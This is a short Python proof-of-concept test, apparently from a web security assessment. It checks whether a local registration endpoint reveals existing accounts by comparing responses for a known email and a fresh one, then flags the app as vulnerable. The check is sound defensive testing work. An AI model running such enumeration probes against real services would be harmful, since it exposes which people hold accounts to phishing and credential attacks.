"""
WSTG-IDNT-04: Registration endpoint enumerates existing accounts.

Compares registration responses for an existing email and a fresh email.

Expected:
- Existing email returns 409 with an explicit 'Email already registered' error
- Fresh email returns 201
"""

from __future__ import annotations

import time
import uuid

import requests


BASE = "http://localhost:3000"
PASSWORD = "password123"


def register(email: str) -> requests.Response:
    username = f"wstg_idnt04_{uuid.uuid4().hex[:10]}"
    return requests.post(
        f"{BASE}/api/auth/register",
        json={
            "email": email,
            "password": PASSWORD,
            "username": username,
            "display_name": "WSTG IDNT04",
        },
        timeout=10,
    )


def main() -> None:
    existing = register("testclient@hireflow.com")
    fresh_email = f"wstg_idnt04_{int(time.time())}_{uuid.uuid4().hex[:8]}@proton.test"
    fresh = register(fresh_email)

    print(f"[+] Existing email status: {existing.status_code}")
    print(f"[+] Existing email body: {existing.text}")
    print(f"[+] Fresh email status: {fresh.status_code}")

    assert existing.status_code == 409, "Expected 409 for existing account"
    assert "Email already registered" in existing.text, "Expected explicit enumeration message"
    assert fresh.status_code == 201, "Expected successful registration for fresh account"

    print("\n[VULNERABLE] Registration endpoint enumerates existing accounts")


if __name__ == "__main__":
    main()
